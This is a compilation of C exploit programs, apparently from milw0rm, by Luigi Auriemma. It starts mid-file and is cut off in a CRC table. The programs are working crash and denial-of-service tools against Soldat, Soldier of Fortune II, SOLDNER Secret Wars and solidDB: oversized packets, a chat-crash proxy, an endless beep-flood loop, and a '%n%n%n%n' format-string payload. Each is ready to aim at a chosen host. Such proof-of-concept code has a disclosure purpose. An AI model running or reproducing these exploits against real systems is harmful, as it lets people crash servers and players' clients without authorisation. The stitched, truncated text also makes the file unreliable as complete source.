            "\n", argv[0], FPORT, GPORT);
        exit(1);
    }

    attack = atoi(argv[1]);
    port = FPORT;
    if(attack == 2) port = GPORT;

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    if(attack == 1) {
        len = 16384;
        memset(buff, 'a', len);
        buff[len - 1] = '\n';

        len = tcp_send_recv(&peer, buff, len, buff, BUFFSZ);

        printf("- if the server was non-dedicated now it should have been crashed\n");

    } else if(attack == 2) {
        peerl.sin_addr.s_addr = INADDR_ANY;
        peerl.sin_port        = htons(LPORT);
        peerl.sin_family      = AF_INET;

        miniproxy(&peer, &peerl, buff);

    } else if(attack == 3) {
        printf("- start attack in endless loop, the dedicated server should beep and freeze:\n");

        for(;;) {
            len = 16384;
            memset(buff, 0x07, len);
            buff[len - 1] = '\n';

            len = tcp_send_recv(&peer, buff, len, buff, BUFFSZ);

            sleep(ONESEC);
        }
    }

    free(buff);
    return(0);
}



    // I have adopted the proxy solution because I don't have time and desire
    // to reverse the cipher method used by Soldat... for one byte only

void miniproxy(struct sockaddr_in *peer, struct sockaddr_in *peerl, u8 *buff) {
    fd_set  rset;
    int     sd,
            sdl,
            selsock,
            len,
            on      = 1,
            psz;

    psz = sizeof(struct sockaddr_in);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- ping server\n");
    SENDTO(sd, "\x69", 1, peer)
    if(timeout(sd) < 0) {
        printf("\nError: socket timeout, check if the target port is correct!\n");
        exit(1);
    }
    len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)peer, &psz);
    if(len < 0) std_err();

    printf("- bind port %hu\n", ntohs(peerl->sin_port));
    sdl = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sdl < 0) std_err();
    if(setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
      < 0) std_err();
    if(bind(sdl, (struct sockaddr *)peerl, sizeof(struct sockaddr_in))
      < 0) std_err();

    printf(
        "- now join the server 127.0.0.1:%hu\n"
        "  if you will type a chat message containing the word \"crash\" any vulnerable\n"
        "  client in the target server will be crashed except you (I limit the reply)\n",
        ntohs(peerl->sin_port));

    selsock = 1 + ((sd > sdl) ? sd : sdl);

    for(;;) {
        FD_ZERO(&rset);
        FD_SET(sd,  &rset);
        FD_SET(sdl, &rset);
        if(select(selsock, &rset, NULL, NULL, NULL)
          < 0) std_err();

        if(FD_ISSET(sd,  &rset)) {          // server
            len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)peer, &psz);
            if(len < 0) break;

            if((buff[0] == 0x06) && (len > 400)) {
                len = 400;
                printf("- limit incoming big packet length\n");
            }

            SENDTO(sdl, buff, len, peerl)
        }

        if(FD_ISSET(sdl, &rset)) {          // client
            len = recvfrom(sdl, buff, BUFFSZ, 0, (struct sockaddr *)peerl, &psz);
            if(len < 0) break;

            if((buff[0] == 0x06) && stristr(buff + 3, "crash")) {
                printf("- exploit the big chat message bug\n");
                len = 600;
                memset(buff + 3, 'a', len - 3);
                buff[len - 1] = 0;
            }

            SENDTO(sd, buff, len, peer)
        }
    }

    free(buff);
}



int tcp_send_recv(struct sockaddr_in *peer, u8 *in, int inlen, u8 *out, int outlen) {
    int     sd;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    printf("- connect...");
    if(connect(sd, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
      < 0) std_err();
    printf("ok\n");

    if(send(sd, in, inlen, 0)
      < 0) std_err();

    outlen = recv(sd, out, outlen, 0);
    if(outlen < 0) std_err();

    close(sd);
    return(outlen);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = 2;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    /*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}




    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      4096
#define PORT        20100
#define TIMEOUT     3
#define CHR         'a'
#define CLBOOMSIZE  2064
#define INFO        "\xff\xff\xff\xff" "getstatus xxx\n"
#define SVBOF       "\xff\xff\xff\xff" "getinfo "
#define CLBOF       "\xff\xff\xff\xff" \
                    "%sResponse\n" \
                    "\\sv_allowDownload\\0" \
                    "\\sv_allowAnonymous\\0" \
                    "\\punkbuster\\1" \
                    "\\needpass\\0" \
                    "\\pure\\0" \
                    "\\gametype\\elim" \
                    "\\sv_maxclients\\32" \
                    "\\clients\\16" \
                    "\\hostname\\noname" \
                    "\\protocol\\2004" \
                    "\\mapname\\mp_jor1" \
                    "\\"



void show_info(u_char *data);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    int         sd,
                len,
                psz,
                on = 1,
                type,
                svboom = 0;
    u_short     port = PORT;
    u_char      buff[BUFFSZ + 1];
    struct  sockaddr_in peer;


    setbuf(stdout, NULL);

    fputs("\n"
        "Soldier of Fortune II <= 1.3 server and client crash/stop "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\nUsage: %s <attack> [port(%d)]\n"
            "\n"
            "Attack:\n"
            " c = broadcast clients crash (caused by a valid reply of %d bytes)\n"
            " s = server shutdown/crash, the effect depends by the amount of data you send.\n"
            "     The amount of data and the IP or hostname of the server must be specified\n"
            "     after the 's' in this format: sof2boom s SIZE SERVER [PORT]\n"
            "     Usually the values >= 1014 crash the server (only if Windows), while a\n"
            "     lower values (like 1000) stop the match, try yourself\n"
            "\n"
            "Usage examples:\n"
            "  sof2boom c                       listens on port %d for clients\n"
            "  sof2boom c 1234                  listens on port 1234\n"
            "  sof2boom s 1000 192.168.0.1      tests the server 192.168.0.1 on port %d\n"
            "  sof2boom s 1200 sof2server 1234  tests the server sof2server on port 1234\n"
            "\n", argv[0], port, CLBOOMSIZE, port, port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif    

    type = argv[1][0];

    if(type == 's') {
        if(argc < 4) {
            fputs("\n"
                "Error: you must specify the number of bytes to send and the server hostname.\n"
                "       Example: sof2boom s 1000 localhost\n"
                "\n", stdout);
            exit(1);
        }
        svboom = atoi(argv[2]);
        if(svboom > (BUFFSZ - sizeof(SVBOF))) {
            printf("\nError: use a value minor than %d\n\n", BUFFSZ - sizeof(SVBOF));
            exit(1);
        }

        peer.sin_addr.s_addr = resolv(argv[3]);
        if(argc > 4) port = atoi(argv[4]);
        printf("- target   %s:%hu\n",
            inet_ntoa(peer.sin_addr),
            port);

    } else if(type == 'c') {
        peer.sin_addr.s_addr = INADDR_ANY;
        psz                  = sizeof(peer);
        if(argc > 2) port = atoi(argv[2]);
        printf("- listen on port %d\n", port);

    } else {
        fputs("\n"
            "Error: Wrong type of chosen attack.\n"
            "       You can choose between 2 types of attacks, passive versus clients with\n"
            "       'c' or versus servers with 's'\n"
            "\n", stdout);
        exit(1);
    }

    peer.sin_port   = htons(port);
    peer.sin_family = AF_INET;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    if(type == 's') {
        fputs("- request informationss\n", stdout);
        if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        if(timeout(sd) < 0) {
            fputs("\n"
                "Error: socket timeout, probably the server is not online or the port is wrong\n"
                "\n", stdout);
            exit(1);
        }
        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
        if(len < 0) std_err();
        buff[len] = 0x00;
        show_info(buff);

        memcpy(buff, SVBOF, sizeof(SVBOF) - 1);
        memset(buff + sizeof(SVBOF) - 1, CHR, svboom);
        len = sizeof(SVBOF) - 1 + svboom;

        printf("- send BOOM packet (%d bytes)\n", len);

        if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        if(timeout(sd) < 0) {
            fputs("- no reply received, it is probably crashed\n", stdout);
        } else {
            fputs("- received a reply, probably it is not vulnerable\n", stdout);
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
        }

        fputs("- check server\n", stdout);
        if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        if(timeout(sd) < 0) {
            fputs("\nServer IS vulnerable!!!\n\n", stdout);
        } else {
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
            buff[len] = 0x00;
            printf("\n"
                "Server doesn't seem to be vulnerable, the following is the reply received:\n"
                "\n"
                "%s\n"
                "\n", buff);
        }

    } else {
        if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
          < 0) std_err();
        if(bind(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputs("  Clients:\n", stdout);
        for(;;) {
            len = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &psz);
            if(len < 0) std_err();
            buff[len] = 0x00;

            printf("%16s:%hu -> %s\n",
                inet_ntoa(peer.sin_addr),
                ntohs(peer.sin_port),
                buff);

            if(!memcmp(buff + 4, "getinfo", 7)) {
                len = sprintf(buff, CLBOF, "info");
            } else {
                len = sprintf(buff, CLBOF, "status");
            }
            memset(buff + len, CHR, CLBOOMSIZE - len);
            if(sendto(sd, buff, CLBOOMSIZE, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
        }
    }

    close(sd);
    return(0);
}



void show_info(u_char *data) {
    int     nt = 1;
    u_char  *p;

    while((p = strchr(data, '\\'))) {
        *p = 0x00;
        if(!nt) {
            printf("%30s: ", data);
            nt++;
        } else {
            printf("%s\n", data);
            nt = 0;
        }
        data = p + 1;
    }
    printf("%s\n", data);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif




// milw0rm.com [2004-11-23]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        20000
#define TIMEOUT     3
#define BOOMSZ      1401

#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
                      < 0) std_err();
#define RECV        if(timeout(sd) < 0) { \
                        fputs("\nError: socket timeout, no reply received\n\n", stdout); \
                        exit(1); \
                    } \
                    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
                    if(len < 0) std_err();



u_short crc16(u_char *data, int len);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[BUFFSZ],
            info[] =
                "\x00\x00"
                "\x02\x00\x00\x00\x00"
                "\x0A"      // size
                "\x05\x00"
                "\x0A"      // size, same of before
                "WING"
                "\x00\x00"  // build version (leave it empty)
                "\x00";


    setbuf(stdout, NULL);

    fputs("\n"
        "SOLDNER Secret Wars <= 30830 socket termination "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- check server:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    *(u_short *)info = crc16(info + 2, sizeof(info) - 3);
    SEND(info, sizeof(info) - 1);
    RECV;

    if(memcmp(buff + 11, "WING", 4)) {
        fputs("\nAlert: the server doesn't seem a valid Soldner server\n", stdout);
    }
    printf("  Build version   %d\n", ntohs(*(u_short *)(buff + 18)));

    printf("\n- send BOOM packet (%d bytes)\n", BOOMSZ);
    memset(buff, 0x00, BOOMSZ);
    SEND(buff, BOOMSZ);

    fputs("- check server again:\n", stdout);
    SEND(info, sizeof(info) - 1);
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }

    close(sd);

    return(0);
}



u_short crc16(u_char *data, int len) {
    u_short *p = (u_short *)data,
            crc = 0;
    int     size = len >> 1;

    while(size--) crc ^= *p++;
           // this ntohs(htons) is needed for big/little endian compatibility
    if(len & 1) crc ^= ntohs(htons(*p) & 0xff00);
    return(crc);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-01-04]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        1315
#define BUFFSZ      0xffff



int solid_send(int sd, int type1, int type2, u8 *data, int len);
int putcc(u8 *data, int chr, int len);
int putsn(u8 *data, u8 *str);
int putmm(u8 *data, u8 *str, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len,
            type1,
            type2,
            attack;
    u16     port    = PORT;
    u8      *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "solidDB <= 06.00.1018 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = format string in logging function\n"
            " 2 = crash caused by arbitrary array index\n"
            " 3 = NULL pointer\n"
            " 4 = server termination through allocation error\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    p = buff;
    if(attack == 1) {
        type1 = 1;
        type2 = 0xd;

        *p++ = 0;
        *p++ = 0;
        *p++ = 0;
        p += putxx(p, 0x01020304,   32);
        p += putxx(p, 6,            32);
        p += putxx(p, 1,            32);
        p += putsn(p, "%n%n%n%n%s%s%s%s%n");
        p += putsn(p, "PASSWORD");  // hashed
        p += putxx(p, 2002,         32);
        p += putsn(p, "myhost");
        p += putxx(p, 4009,         32);    *p++ = 1;
        p += putxx(p, 4008,         32);    *p++ = 0;
        p += putxx(p, 4007,         32);    *p++ = 1;
        p += putxx(p, 4005,         32);    *p++ = 1;
        p += putxx(p, 4004,         32);    *p++ = 1;
        p += putxx(p, 4,            32);
        p += putxx(p, 268,          32);
        p += putxx(p, 4003,         32);    *p++ = 0;
        p += putxx(p, 4002,         32);    *p++ = 1;
        p += putxx(p, 0,            32);

    } else if(attack == 2) {
        type1 = 3;
        type2 = 2;

        *p++ = 0;
        *p++ = 0;
        *p++ = 0;
        p += putxx(p, 0x01020304,   32);    // index number

    } else if(attack == 3) {
        type1 = 0;
        type2 = 0x11;

        *p++ = 0;
        *p++ = 0;
        *p++ = 0;

    } else if(attack == 4) {
        type1 = 0;
        type2 = 0x12;

        *p++ = 0;
        *p++ = 0;
        *p++ = 0;
        p += putxx(p, 0,            32);
        p += putxx(p, 0x80000,      32);
        p += putxx(p, 0x7fffffff,   32);

    } else {
        printf("\nError: wrong attack number\n");
        exit(1);
    }

    solid_send(sd, type1, type2, buff, p - buff);
    while(!timeout(sd, 3)) {
        len = recv(sd, buff, BUFFSZ, 0);
        if(len < 0) break;
        printf("- received %d bytes\n", len);
    }

    close(sd);
    printf("- done\n");
    return(0);
}



int solid_send(int sd, int type1, int type2, u8 *data, int len) {
    u8      hdr[8],
            *p;

    p = hdr;
    p += putxx(p, 0x02,     8);
    p += putxx(p, 0x00,     8);
    p += putxx(p, 0x00,     8);
    p += putxx(p, (type1 >> 8) | (type1 << 8),  16);    // swapped 0 - 12
    p += putxx(p, (type2 >> 8) | (type2 << 8),  16);    // swapped 0 - 26
    p += putxx(p, 0x01,     8);

    printf("- send %d bytes\n", 8 + len);
    send(sd, hdr,  8,   0);
    send(sd, data, len, 0);
    return(0);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putsn(u8 *data, u8 *str) {
    int     len;

    len = strlen(str);
    putxx(data, len, 32);
    memcpy(data + 4, str, len);
    return(4 + len);
}



int putmm(u8 *data, u8 *str, int len) {
    memcpy(data, str, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
/*

Show_dump 0.1

    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

function to show the hex dump of a buffer

Usage:

    to show the hex dump on the screen:
        show_dump(buffer, buffer_length, stdout);

    to write the hex dump in a file or other streams:
        show_dump(buffer, buffer_length, fd);

    (if you know C you know what FILE *stream means 8-)
*/



void show_dump(unsigned char *buff, unsigned long buffsz, FILE *stream) {
    const char      *hex = "0123456789abcdef";
    unsigned char   buffout[68],
                    *pout,
                    *p1,
                    *p2,
                    i,
                    rest;


    p1 = buff;
    p2 = buff;

    while(buffsz) {

        pout = buffout;
        if(buffsz < 16) rest = buffsz;
            else rest = 16;

        for(i = 0; i < rest; i++, p1++) {
            *pout++ = hex[*p1 >> 4];
            *pout++ = hex[*p1 & 0xf];
            *pout++ = 0x20;
        }

        for(i = pout - buffout; i < 50; i++, pout++) *pout = 0x20;

        for(i = 0; i < rest; i++, p2++, pout++) {
            if(*p2 >= 0x20) *pout = *p2;
                else *pout = 0x2e;
        }

        *pout++ = 0x0a;
        *pout   = 0x00;

        fputs(buffout, stream);
        buffsz -= rest;
    }
}



/*

StarWars Battlefront CRC32 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:    http://aluigi.altervista.org


INTRODUCTION
============
This modified CRC32 algorithm is used for some operations like the
password authentication, in fact the password is a checksum comparison.


EXAMPLE
=======
mycrc = swbcrc(password, stlren(password));


LICENSE
=======
    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt

*/

unsigned long swbcrc(unsigned char *data, int size) {
    const static unsigned long  crctable[] = {
        0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9,
        0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,
        0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61,
